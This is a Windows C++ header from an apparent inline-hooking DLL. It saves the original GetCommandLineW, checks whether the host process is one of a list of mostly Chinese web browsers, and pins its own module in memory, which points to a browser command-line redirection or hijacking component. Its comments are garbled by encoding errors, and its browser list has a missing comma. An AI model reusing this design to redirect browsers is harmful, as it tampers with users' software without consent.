#pragma once
#include <tchar.h>
#include <assert.h>
#include <windows.h>

#include "CommonControl\Log.h"
#include "CommonControl\Commonfun.h"
#include "HookControl\HookHelp.h"
#include "HookControl\InlineHook.h"

#define _W(_str)		L##_str
#define _S(_str)		_str

#define ASSERT assert
#define ARR_COUNT(_array) (sizeof(_array) / sizeof(_array[0]))

typedef LPWSTR(WINAPI *__pfnGetCommandLineW) (VOID);

namespace Global {
	extern CDebug Log;
	extern __pfnGetCommandLineW pfnGetCommandLineW;
}

inline const wchar_t * __cdecl wcsistr(const wchar_t * str1, const wchar_t * str2)
{
	const wchar_t *cp = (const wchar_t *)str1;
	const wchar_t *s1, *s2;
	wchar_t c1 = L'\0', c2 = L'\0';

	if (!*str2)
		return((const wchar_t *)str1);

	while (*cp)
	{
		s1 = cp;
		s2 = (const wchar_t *)str2;
		c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
		c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;

		while (c1 && c2 && !(c1 - c2))
		{
			s1++, s2++;

			c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
			c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;
		}

		if (!*s2)
			return(cp);

		cp++;
	}

	return(NULL);

}

namespace {

	const wchar_t * ptszHitDllLists[] = {
		_W("Chrome.dll") , /* chrome ���������*/
		_W("MxWebkit.dll") , /* ���� ���������*/
		_W("WebkitCore.dll") , /* �ѹ� ���������*/
		_W("MxWebkit.dll") , /* chrome ���������*/
		_W("MxWebkit.dll") , /* chrome ���������*/
		_W("MxWebkit.dll") , /* chrome ���������*/
		_W("FastProxy.dll"), _W("ChromeCore.dll") , /* chrome ���������*/
	};

	const wchar_t * ptszHitProcessNameLists[] = {
		_W("iexplore.exe")/* IE ���������*/,

		_W("maxthon.exe")/* ���� ���������*/,
		_W("liebao.exe")/* �Ա� ���������*/,
		_W("360se.exe")/* 360��ȫ ���������*/,
		_W("360chrome.exe")/* 360���� ���������*/,
		_W("chrome.exe")/* Chrome ���������*/,
		_W("qqbrowser.exe")/* QQ ���������*/,
		_W("twchrome.exe")/* ����֮�� ���������*/,
		_W("sogouexplorer.exe")/* �ѹ� ���������*/,
		_W("baidubrowser.exe")/* �ٶ� ���������*/, //������޷��򿪵����
		_W("2345explorer.exe")/* 2345 ���������*/,

		_W("f1browser.exe")/* F1 ���������*/,

		_W("yidian.exe")/* һ������� �������� Ӧ���ǵ���ʵ���ƹ�˾��*/

		_W("\\application\\")/* F1 ���������*/,
		_W("�����\\")/* F1 ���������*/,
		_W("\\�����")/* F1 ���������*/,
	};

}

inline PPEB GetCurrentProcessPEB()
{
	return PPEB(__readfsdword(0x30));
}

inline PRTL_USER_PROCESS_PARAMETERS GetCurrentProcessParameters() {
	PPEB pProcessPEB = GetCurrentProcessPEB();

	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
		return NULL;
	}

	if (NULL == pProcessPEB->ProcessParameters->CommandLine.Buffer || NULL == pProcessPEB->ProcessParameters->ImagePathName.Buffer) {
		return NULL;
	}

	return pProcessPEB->ProcessParameters;
}

inline bool IsRedirectWebBrowser(const wchar_t * pcwszCheckString) {
	HINSTANCE hHitInstance = NULL;
	const wchar_t * pwszHitBrowserRule = NULL;

	//////////////////////////////////////////////////////////////////////////
	/// ͨ���������ж������

	for (int i = 0; i < ARR_COUNT(ptszHitProcessNameLists); i++) {
		pwszHitBrowserRule = ptszHitProcessNameLists[i];

		if (NULL != wcsistr(pcwszCheckString, pwszHitBrowserRule)) {
			return true;
		}
		pwszHitBrowserRule = NULL;
	}

	////////////////////////////////////////////////////////////////////////////
	///// ͨ�������ļ��ж������

	//for (int i = 0; i < sizeof(ptszHitDllLists) / sizeof(ptszHitDllLists[0]); i++) {
	//	pwszHitBrowserRule = ptszHitDllLists[i];

	//	if (LockModule(pwszHitBrowserRule, &hHitInstance)) {
	//		UnlockModule(hHitInstance);
	//		return true;
	//	}

	//	pwszHitBrowserRule = NULL;
	//}

	return false;
}

inline bool LockCurrentModule() {
	char szModuleName[MAX_PATH + 1] = { 0 };
	GetModuleFileNameA(Common::GetModuleHandleByAddr(LockCurrentModule), szModuleName, MAX_PATH);

	return NULL != LoadLibraryA(szModuleName);
}

inline bool LockModule(_In_opt_ LPCWSTR lpModuleName, _Out_ HMODULE * phModule)
{
	BOOL bIsOK = FALSE;

#ifdef _DEBUG
	bIsOK = GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_PIN, lpModuleName, phModule);
#else
	bIsOK = GetModuleHandleExW(0, lpModuleName, phModule);
#endif

	if (bIsOK)
		ASSERT(NULL != *phModule);
	//	else
	//		ASSERT(NULL == GetModuleHandle(lpModuleName));

	return TRUE == bIsOK;
}

inline bool UnlockModule(HMODULE hModule)
{
	return TRUE == FreeLibrary(hModule);
}
